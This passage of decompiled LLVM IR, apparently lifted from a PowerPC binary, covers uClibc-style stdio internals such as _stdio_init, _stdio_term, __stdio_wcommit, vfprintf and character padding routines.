  br i1 %v3_1000b748, label %dec_label_pc_1000b750, label %dec_label_pc_1000b780

dec_label_pc_1000b750:                            ; preds = %dec_label_pc_1000b6ec
  store i32 4096, i32* @r3, align 4
  store i32 268482392, i32* @lr, align 4
  %v0_1000b754 = call i32 @malloc()
  %v3_1000b758 = icmp eq i32 %v0_1000b754, 0
  %v1_1000b75c = load i32, i32* @r31, align 4
  %v2_1000b75c = add i32 %v1_1000b75c, 8
  %v3_1000b75c = inttoptr i32 %v2_1000b75c to i32*
  store i32 %v0_1000b754, i32* %v3_1000b75c, align 4
  %v1_1000b77c = load i32, i32* @r31, align 4
  br i1 %v3_1000b758, label %dec_label_pc_1000b77c, label %dec_label_pc_1000b764

dec_label_pc_1000b764:                            ; preds = %dec_label_pc_1000b750
  %v1_1000b764 = inttoptr i32 %v1_1000b77c to i16*
  %v2_1000b764 = load i16, i16* %v1_1000b764, align 2
  %v3_1000b764 = zext i16 %v2_1000b764 to i32
  store i32 %v3_1000b764, i32* %r0.global-to-local, align 4
  %v1_1000b768 = add i32 %v0_1000b754, 4096
  store i32 %v1_1000b768, i32* %r9.global-to-local, align 4
  %v2_1000b76c = add i32 %v1_1000b77c, 12
  %v3_1000b76c = inttoptr i32 %v2_1000b76c to i32*
  store i32 %v1_1000b768, i32* %v3_1000b76c, align 4
  %v0_1000b770 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b770 = or i32 %v0_1000b770, 16384
  store i32 %v1_1000b770, i32* %r0.global-to-local, align 4
  %v1_1000b774 = trunc i32 %v1_1000b770 to i16
  %v2_1000b774 = load i32, i32* @r31, align 4
  %v3_1000b774 = inttoptr i32 %v2_1000b774 to i16*
  store i16 %v1_1000b774, i16* %v3_1000b774, align 2
  br label %dec_label_pc_1000b780

dec_label_pc_1000b77c:                            ; preds = %dec_label_pc_1000b750
  %v2_1000b77c = add i32 %v1_1000b77c, 12
  %v3_1000b77c = inttoptr i32 %v2_1000b77c to i32*
  store i32 0, i32* %v3_1000b77c, align 4
  br label %dec_label_pc_1000b780

dec_label_pc_1000b780:                            ; preds = %dec_label_pc_1000b6ec, %dec_label_pc_1000b764, %dec_label_pc_1000b77c
  %v0_1000b780 = load i32, i32* @r31, align 4
  %v1_1000b780 = inttoptr i32 %v0_1000b780 to i16*
  %v2_1000b780 = load i16, i16* %v1_1000b780, align 2
  %v3_1000b780 = zext i16 %v2_1000b780 to i32
  store i32 %v3_1000b780, i32* %r0.global-to-local, align 4
  %v1_1000b784 = add i32 %v0_1000b780, 8
  %v2_1000b784 = inttoptr i32 %v1_1000b784 to i32*
  %v3_1000b784 = load i32, i32* %v2_1000b784, align 4
  store i32 %v3_1000b784, i32* %r9.global-to-local, align 4
  %v1_1000b788 = and i32 %v3_1000b780, 8192
  %v3_1000b788 = icmp eq i32 %v1_1000b788, 0
  store i1 %v3_1000b788, i1* %cr0_eq.global-to-local, align 1
  %v3_1000b790 = add i32 %v0_1000b780, 2
  %v4_1000b790 = inttoptr i32 %v3_1000b790 to i8*
  store i8 0, i8* %v4_1000b790, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000b798 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b798 = load i32, i32* @r31, align 4
  %v2_1000b798 = add i32 %v1_1000b798, 20
  %v3_1000b798 = inttoptr i32 %v2_1000b798 to i32*
  store i32 %v0_1000b798, i32* %v3_1000b798, align 4
  %v0_1000b79c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b79c = load i32, i32* @r31, align 4
  %v2_1000b79c = add i32 %v1_1000b79c, 24
  %v3_1000b79c = inttoptr i32 %v2_1000b79c to i32*
  store i32 %v0_1000b79c, i32* %v3_1000b79c, align 4
  %v0_1000b7a0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b7a0 = load i32, i32* @r31, align 4
  %v2_1000b7a0 = add i32 %v1_1000b7a0, 28
  %v3_1000b7a0 = inttoptr i32 %v2_1000b7a0 to i32*
  store i32 %v0_1000b7a0, i32* %v3_1000b7a0, align 4
  %v0_1000b7a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b7a4 = load i32, i32* @r31, align 4
  %v2_1000b7a4 = add i32 %v1_1000b7a4, 16
  %v3_1000b7a4 = inttoptr i32 %v2_1000b7a4 to i32*
  store i32 %v0_1000b7a4, i32* %v3_1000b7a4, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v0_1000b7ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b7ac = load i32, i32* @r31, align 4
  %v2_1000b7ac = add i32 %v1_1000b7ac, 44
  %v3_1000b7ac = inttoptr i32 %v2_1000b7ac to i32*
  store i32 %v0_1000b7ac, i32* %v3_1000b7ac, align 4
  %v3_1000b7b0 = load i32, i32* @global_var_1002e5d4.833, align 4
  store i32 %v3_1000b7b0, i32* %r0.global-to-local, align 4
  %v1_1000b7b4 = load i32, i32* @r31, align 4
  %v2_1000b7b4 = add i32 %v1_1000b7b4, 52
  %v3_1000b7b4 = inttoptr i32 %v2_1000b7b4 to i32*
  store i32 %v3_1000b7b0, i32* %v3_1000b7b4, align 4
  %v0_1000b7b8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000b7b8, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b7bc

dec_label_pc_1000b7bc:                            ; preds = %dec_label_pc_1000b780
  store i32 ptrtoint ([3 x i8]* @global_var_1000f670.827 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002e290.828 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b7cc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b7cc, i32* @r26, align 4
  store i32 %v2_1000b7cc, i32* @r3, align 4
  %v0_1000b7dc = call i32 @__pthread_return_void()
  %v2_1000b7e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b7e8, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002e278.834 to i32), i32* @r29, align 4
  %v0_1000b7f0 = call i32 @__pthread_return_0()
  store i32 %v2_1000b7e8, i32* @r3, align 4
  %v0_1000b800 = call i32 @__pthread_return_void()
  %v0_1000b808 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b810 = load i32, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  store i32 %v3_1000b810, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b7e8, i32* @r3, align 4
  %v1_1000b81c = load i32, i32* @r31, align 4
  %v2_1000b81c = add i32 %v1_1000b81c, 32
  %v3_1000b81c = inttoptr i32 %v2_1000b81c to i32*
  store i32 %v3_1000b810, i32* %v3_1000b81c, align 4
  %v0_1000b820 = load i32, i32* @r31, align 4
  store i32 %v0_1000b820, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  %v0_1000b824 = call i32 @__pthread_return_void()
  store i32 %v2_1000b7cc, i32* @r3, align 4
  %v0_1000b830 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000b83c

dec_label_pc_1000b838:                            ; preds = %dec_label_pc_1000b5ec, %dec_label_pc_1000b5d8, %dec_label_pc_1000b5f8
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000b83c

dec_label_pc_1000b83c:                            ; preds = %dec_label_pc_1000b780, %dec_label_pc_1000b638, %dec_label_pc_1000b7bc, %dec_label_pc_1000b838
  store i32 %v0_1000b598, i32* %r0.global-to-local, align 4
  %v0_1000b840 = load i32, i32* @r31, align 4
  ret i32 %v0_1000b840

; uselistorder directives
  uselistorder i32 %v1_1000b77c, { 2, 0, 1 }
  uselistorder i32 %v0_1000b6f0, { 1, 0 }
  uselistorder i32 %v0_1000b63c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000b628, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3, 4 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_1000b83c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b838, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b780, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b6cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b660, { 1, 0 }
  uselistorder label %dec_label_pc_1000b630, { 1, 0 }
  uselistorder label %dec_label_pc_1000b61c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b608, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r28, align 4
  %v0_1000b868 = call i32 @__errno_location()
  store i32 %v0_1000b868, i32* @r26, align 4
  %v1_1000b874 = inttoptr i32 %v0_1000b868 to i32*
  %v2_1000b874 = load i32, i32* %v1_1000b874, align 4
  store i32 %v2_1000b874, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1002e2a8.228 to i32), i32* @r27, align 4
  %v3_1000b87c = load i16, i16* @global_var_1002e2a8.228, align 2
  %v4_1000b87c = zext i16 %v3_1000b87c to i32
  store i32 %v4_1000b87c, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b884.837 to i32), i32* @lr, align 4
  %v1_1000b880 = call i32 @isatty(i32 0)
  %v1_1000b884 = sub i32 1, %v1_1000b880
  %v1_1000b888 = mul i32 %v1_1000b884, 256
  %v0_1000b88c = load i32, i32* @r29, align 4
  %v2_1000b88c = xor i32 %v1_1000b888, %v0_1000b88c
  %v1_1000b894 = trunc i32 %v2_1000b88c to i16
  store i16 %v1_1000b894, i16* @global_var_1002e2a8.228, align 2
  %v3_1000b898 = load i16, i16* @global_var_1002e2f8.229, align 2
  %v4_1000b898 = zext i16 %v3_1000b898 to i32
  store i32 %v4_1000b898, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b8a0.838 to i32), i32* @lr, align 4
  %v1_1000b89c = call i32 @isatty(i32 1)
  %v1_1000b8a0 = sub i32 1, %v1_1000b89c
  %v1_1000b8a4 = mul i32 %v1_1000b8a0, 256
  %v0_1000b8a8 = load i32, i32* @r29, align 4
  %v2_1000b8a8 = xor i32 %v1_1000b8a4, %v0_1000b8a8
  %v1_1000b8ac = trunc i32 %v2_1000b8a8 to i16
  store i16 %v1_1000b8ac, i16* @global_var_1002e2f8.229, align 2
  %v0_1000b8b0 = load i32, i32* @r25, align 4
  %v1_1000b8b0 = load i32, i32* @r26, align 4
  %v2_1000b8b0 = inttoptr i32 %v1_1000b8b0 to i32*
  store i32 %v0_1000b8b0, i32* %v2_1000b8b0, align 4
  ret i32 %v1_1000b8a4

; uselistorder directives
  uselistorder i32 %v1_1000b8a4, { 1, 0 }
  uselistorder i16* @global_var_1002e2f8.229, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001c868.839 to i32), i32* @r4, align 4
  %v0_1000b8d4 = call i32 @memcpy()
  ret i32 %v0_1000b8d4
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002e278.834 to i32), i32* @r3, align 4
  store i32 268482804, i32* @lr, align 4
  %v0_1000b8f0 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1002e290.828 to i32), i32* @r3, align 4
  store i32 268482816, i32* @lr, align 4
  %v0_1000b8fc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_1000b9489 = icmp eq i32 %storemerge6, 0
  %v1_1000b94c11 = add i32 %storemerge6, 56
  store i32 %v1_1000b94c11, i32* %r30.global-to-local, align 4
  br i1 %v3_1000b9489, label %dec_label_pc_1000b958, label %dec_label_pc_1000b90c

dec_label_pc_1000b90c:                            ; preds = %entry, %dec_label_pc_1000b938
  %v0_1000b90c = call i32 @__pthread_return_0()
  %v3_1000b910 = icmp eq i32 %v0_1000b90c, 0
  %v0_1000b914 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000b914, i32* @r3, align 4
  br i1 %v3_1000b910, label %dec_label_pc_1000b938, label %dec_label_pc_1000b91c

dec_label_pc_1000b91c:                            ; preds = %dec_label_pc_1000b90c
  %v0_1000b91c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b91c = add i32 %v0_1000b91c, 8
  %v2_1000b91c = inttoptr i32 %v1_1000b91c to i32*
  %v3_1000b91c = load i32, i32* %v2_1000b91c, align 4
  store i32 %v3_1000b91c, i32* %r9.global-to-local, align 4
  %v3_1000b924 = inttoptr i32 %v0_1000b91c to i16*
  store i16 48, i16* %v3_1000b924, align 2
  %v0_1000b928 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b928 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b928 = add i32 %v1_1000b928, 20
  %v3_1000b928 = inttoptr i32 %v2_1000b928 to i32*
  store i32 %v0_1000b928, i32* %v3_1000b928, align 4
  %v0_1000b92c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b92c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b92c = add i32 %v1_1000b92c, 24
  %v3_1000b92c = inttoptr i32 %v2_1000b92c to i32*
  store i32 %v0_1000b92c, i32* %v3_1000b92c, align 4
  %v0_1000b930 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b930 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b930 = add i32 %v1_1000b930, 28
  %v3_1000b930 = inttoptr i32 %v2_1000b930 to i32*
  store i32 %v0_1000b930, i32* %v3_1000b930, align 4
  %v0_1000b934 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b934 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b934 = add i32 %v1_1000b934, 16
  %v3_1000b934 = inttoptr i32 %v2_1000b934 to i32*
  store i32 %v0_1000b934, i32* %v3_1000b934, align 4
  br label %dec_label_pc_1000b938

dec_label_pc_1000b938:                            ; preds = %dec_label_pc_1000b90c, %dec_label_pc_1000b91c
  %v1_1000b93c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b93c = add i32 %v1_1000b93c, 52
  %v3_1000b93c = inttoptr i32 %v2_1000b93c to i32*
  store i32 1, i32* %v3_1000b93c, align 4
  store i32 268482884, i32* @lr, align 4
  %v0_1000b940 = call i32 @__stdio_init_mutex()
  %v0_1000b944 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000b944 = add i32 %v0_1000b944, 32
  %v2_1000b944 = inttoptr i32 %v1_1000b944 to i32*
  %storemerge = load i32, i32* %v2_1000b944, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_1000b948 = icmp eq i32 %storemerge, 0
  %v1_1000b94c = add i32 %storemerge, 56
  store i32 %v1_1000b94c, i32* %r30.global-to-local, align 4
  br i1 %v3_1000b948, label %dec_label_pc_1000b948.dec_label_pc_1000b958_crit_edge, label %dec_label_pc_1000b90c

dec_label_pc_1000b948.dec_label_pc_1000b958_crit_edge: ; preds = %dec_label_pc_1000b938
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1002e5d0.835 to i32*), align 4
  br label %dec_label_pc_1000b958

dec_label_pc_1000b958:                            ; preds = %dec_label_pc_1000b948.dec_label_pc_1000b958_crit_edge, %entry
  %v0_1000b99416 = phi i32 [ %v1_1000b94c, %dec_label_pc_1000b948.dec_label_pc_1000b958_crit_edge ], [ %v1_1000b94c11, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_1000b948.dec_label_pc_1000b958_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000b97c5 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000b97c5, label %dec_label_pc_1000b984, label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b958, %dec_label_pc_1000b978
  %v0_1000b964 = phi i32 [ %storemerge1, %dec_label_pc_1000b978 ], [ %storemerge12, %dec_label_pc_1000b958 ]
  %v1_1000b964 = inttoptr i32 %v0_1000b964 to i16*
  %v2_1000b964 = load i16, i16* %v1_1000b964, align 2
  %v3_1000b964 = zext i16 %v2_1000b964 to i32
  store i32 %v0_1000b964, i32* @r3, align 4
  %v1_1000b96c = and i32 %v3_1000b964, 64
  store i32 %v1_1000b96c, i32* %r9.global-to-local, align 4
  %v3_1000b96c = icmp eq i32 %v1_1000b96c, 0
  br i1 %v3_1000b96c, label %dec_label_pc_1000b978, label %dec_label_pc_1000b974

dec_label_pc_1000b974:                            ; preds = %dec_label_pc_1000b964
  store i32 268482936, i32* @lr, align 4
  %v0_1000b974 = call i32 @__stdio_wcommit()
  %v0_1000b978.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b978

dec_label_pc_1000b978:                            ; preds = %dec_label_pc_1000b964, %dec_label_pc_1000b974
  %v0_1000b978 = phi i32 [ %v0_1000b964, %dec_label_pc_1000b964 ], [ %v0_1000b978.pre, %dec_label_pc_1000b974 ]
  %v0_1000b99417 = phi i32 [ %v0_1000b964, %dec_label_pc_1000b964 ], [ %v0_1000b974, %dec_label_pc_1000b974 ]
  %v1_1000b978 = add i32 %v0_1000b978, 32
  %v2_1000b978 = inttoptr i32 %v1_1000b978 to i32*
  %storemerge1 = load i32, i32* %v2_1000b978, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000b97c = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000b97c, label %dec_label_pc_1000b984, label %dec_label_pc_1000b964

dec_label_pc_1000b984:                            ; preds = %dec_label_pc_1000b978, %dec_label_pc_1000b958
  %v0_1000b994 = phi i32 [ %v0_1000b99416, %dec_label_pc_1000b958 ], [ %v0_1000b99417, %dec_label_pc_1000b978 ]
  ret i32 %v0_1000b994

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000b964, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000b978, { 1, 0 }
  uselistorder label %dec_label_pc_1000b964, { 1, 0 }
  uselistorder label %dec_label_pc_1000b938, { 1, 0 }
  uselistorder label %dec_label_pc_1000b90c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000b9a0 = load i32, i32* @r31, align 4
  %v0_1000b9a4 = load i32, i32* @r3, align 4
  %v1_1000b9ac = add i32 %v0_1000b9a4, 8
  %v2_1000b9ac = inttoptr i32 %v1_1000b9ac to i32*
  %v3_1000b9ac = load i32, i32* %v2_1000b9ac, align 4
  %v1_1000b9b0 = add i32 %v0_1000b9a4, 16
  %v2_1000b9b0 = inttoptr i32 %v1_1000b9b0 to i32*
  %v3_1000b9b0 = load i32, i32* %v2_1000b9b0, align 4
  %v2_1000b9b8 = sub i32 %v3_1000b9b0, %v3_1000b9ac
  store i32 %v2_1000b9b8, i32* @r5, align 4
  %v5_1000b9b8 = icmp eq i32 %v2_1000b9b8, 0
  br i1 %v5_1000b9b8, label %dec_label_pc_1000b9c8, label %dec_label_pc_1000b9c0

dec_label_pc_1000b9c0:                            ; preds = %entry
  store i32 %v3_1000b9ac, i32* %v2_1000b9b0, align 4
  store i32 268483016, i32* @lr, align 4
  %v2_1000b9c4 = inttoptr i32 %v3_1000b9ac to i16*
  %v3_1000b9c4 = call i32 @__stdio_WRITE(i16* %v2_1000b9c4, i32 %v2_1000b9b8)
  %v0_1000b9c8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b9c8

dec_label_pc_1000b9c8:                            ; preds = %entry, %dec_label_pc_1000b9c0
  %v0_1000b9c8 = phi i32 [ %v0_1000b9a4, %entry ], [ %v0_1000b9c8.pre, %dec_label_pc_1000b9c0 ]
  %v1_1000b9c8 = add i32 %v0_1000b9c8, 8
  %v2_1000b9c8 = inttoptr i32 %v1_1000b9c8 to i32*
  %v3_1000b9c8 = load i32, i32* %v2_1000b9c8, align 4
  %v1_1000b9cc = add i32 %v0_1000b9c8, 16
  %v2_1000b9cc = inttoptr i32 %v1_1000b9cc to i32*
  %v3_1000b9cc = load i32, i32* %v2_1000b9cc, align 4
  store i32 %v0_1000b9a0, i32* @r31, align 4
  %v2_1000b9d4 = sub i32 %v3_1000b9cc, %v3_1000b9c8
  ret i32 %v2_1000b9d4

; uselistorder directives
  uselistorder i32 %v0_1000b9c8, { 1, 0 }
  uselistorder i32 %v3_1000b9ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b9c8, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000ba08 = add i32 %tmp, 52
  %v3_1000ba08 = inttoptr i32 %v2_1000ba08 to i32*
  %v4_1000ba08 = load i32, i32* %v3_1000ba08, align 4
  store i32 %v4_1000ba08, i32* @r28, align 4
  store i32 %arg3, i32* @r27, align 4
  %v2_1000ba10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000ba10, i32* @r3, align 4
  %v3_1000ba18 = icmp eq i32 %v4_1000ba08, 0
  br i1 %v3_1000ba18, label %dec_label_pc_1000ba24, label %dec_label_pc_1000ba30

dec_label_pc_1000ba24:                            ; preds = %entry
  %v0_1000ba24 = call i32 @__pthread_return_void()
  %v0_1000ba2c = call i32 @__pthread_return_0()
  %v0_1000ba30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ba30

dec_label_pc_1000ba30:                            ; preds = %entry, %dec_label_pc_1000ba24
  %v0_1000ba30 = phi i32 [ %tmp, %entry ], [ %v0_1000ba30.pre, %dec_label_pc_1000ba24 ]
  %v1_1000ba30 = inttoptr i32 %v0_1000ba30 to i16*
  %v2_1000ba30 = load i16, i16* %v1_1000ba30, align 2
  %v3_1000ba30 = zext i16 %v2_1000ba30 to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_1000ba30, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_1000ba40 = call i32 @__asm_rlwinm(i32 %v3_1000ba30, i32 0, i32 24, i32 25)
  %v3_1000ba44 = icmp eq i32 %v1_1000ba40, 192
  br i1 %v3_1000ba44, label %dec_label_pc_1000ba58, label %dec_label_pc_1000ba4c

dec_label_pc_1000ba4c:                            ; preds = %dec_label_pc_1000ba30
  store i32 268483152, i32* @lr, align 4
  %v0_1000ba4c = call i32 @__stdio_trans2w_o()
  %v3_1000ba50 = icmp eq i32 %v0_1000ba4c, 0
  br i1 %v3_1000ba50, label %dec_label_pc_1000ba58, label %dec_label_pc_1000ba6c

dec_label_pc_1000ba58:                            ; preds = %dec_label_pc_1000ba4c, %dec_label_pc_1000ba30
  %v0_1000ba58 = load i32, i32* @r29, align 4
  store i32 %v0_1000ba58, i32* @r4, align 4
  %v0_1000ba5c = load i32, i32* @r27, align 4
  store i32 %v0_1000ba5c, i32* @r5, align 4
  %v0_1000ba60 = load i32, i32* @r31, align 4
  store i32 %v0_1000ba60, i32* @r3, align 4
  store i32 268483176, i32* @lr, align 4
  %v0_1000ba64 = call i32 @_vfprintf_internal()
  store i32 %v0_1000ba64, i32* @r30, align 4
  br label %dec_label_pc_1000ba6c

dec_label_pc_1000ba6c:                            ; preds = %dec_label_pc_1000ba4c, %dec_label_pc_1000ba58
  %v0_1000ba6c = load i32, i32* @r28, align 4
  %v3_1000ba6c = icmp eq i32 %v0_1000ba6c, 0
  store i32 %v2_1000ba10, i32* @r3, align 4
  br i1 %v3_1000ba6c, label %dec_label_pc_1000ba7c, label %dec_label_pc_1000ba80

dec_label_pc_1000ba7c:                            ; preds = %dec_label_pc_1000ba6c
  %v0_1000ba7c = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000ba80

dec_label_pc_1000ba80:                            ; preds = %dec_label_pc_1000ba6c, %dec_label_pc_1000ba7c
  %v0_1000ba84 = load i32, i32* @r30, align 4
  ret i32 %v0_1000ba84

; uselistorder directives
  uselistorder i32 %v0_1000ba30, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 ()* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba30, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000bac03 = icmp eq i32 %arg3, 0
  %v2_1000bac4 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000bac03, label %dec_label_pc_1000bae0, label %dec_label_pc_1000bad4

dec_label_pc_1000babc:                            ; preds = %dec_label_pc_1000bad4
  %v1_1000babc = add i32 %v0_1000babc, -1
  store i32 %v1_1000babc, i32* @r31, align 4
  %v3_1000bac0 = icmp eq i32 %v1_1000babc, 0
  %v0_1000bacc = load i32, i32* @r29, align 4
  br i1 %v3_1000bac0, label %dec_label_pc_1000bae0.loopexit, label %dec_label_pc_1000bad4

dec_label_pc_1000bad4:                            ; preds = %entry, %dec_label_pc_1000babc
  %v0_1000bacc5 = phi i32 [ %v0_1000bacc, %dec_label_pc_1000babc ], [ %arg1, %entry ]
  store i32 268483288, i32* @lr, align 4
  %v3_1000bad4 = inttoptr i32 %v0_1000bacc5 to i16*
  %v4_1000bad4 = call i32 @__stdio_fwrite(i32 %v2_1000bac4, i32 1, i16* %v3_1000bad4)
  %v3_1000bad8 = icmp eq i32 %v4_1000bad4, 1
  %v0_1000babc = load i32, i32* @r31, align 4
  br i1 %v3_1000bad8, label %dec_label_pc_1000babc, label %dec_label_pc_1000bae0.loopexit

dec_label_pc_1000bae0.loopexit:                   ; preds = %dec_label_pc_1000babc, %dec_label_pc_1000bad4
  %v0_1000bae4.ph = phi i32 [ %v0_1000babc, %dec_label_pc_1000bad4 ], [ 0, %dec_label_pc_1000babc ]
  %v1_1000bae4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000bae0

dec_label_pc_1000bae0:                            ; preds = %dec_label_pc_1000bae0.loopexit, %entry
  %v1_1000bae4 = phi i32 [ 0, %entry ], [ %v1_1000bae4.pre, %dec_label_pc_1000bae0.loopexit ]
  %v0_1000bae4 = phi i32 [ 0, %entry ], [ %v0_1000bae4.ph, %dec_label_pc_1000bae0.loopexit ]
  %v2_1000bae4 = sub i32 %v1_1000bae4, %v0_1000bae4
  ret i32 %v2_1000bae4

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bae0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000bad4, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000bb0c = and i32 %arg2, 128
  %v3_1000bb0c = icmp eq i32 %v1_1000bb0c, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000bb0c, label %dec_label_pc_1000bb5c, label %dec_label_pc_1000bb28

dec_label_pc_1000bb28:                            ; preds = %entry
  %v0_1000bb28 = call i32 @__GI_strlen()
  %v0_1000bb2c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000bb28, i32* @r31, align 4
  %v0_1000bb34 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000bb38 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000bb38 = sub i32 %v1_1000bb38, %v0_1000bb28
  store i32 %v2_1000bb38, i32* %r29.global-to-local, align 4
  store i32 %v0_1000bb28, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000bb38, 1
  br i1 %tmp7, label %dec_label_pc_1000bb5c, label %dec_label_pc_1000bb48

dec_label_pc_1000bb48:                            ; preds = %dec_label_pc_1000bb28
  %v1_1000bb2c = urem i32 %v0_1000bb2c, 128
  store i32 268483404, i32* @lr, align 4
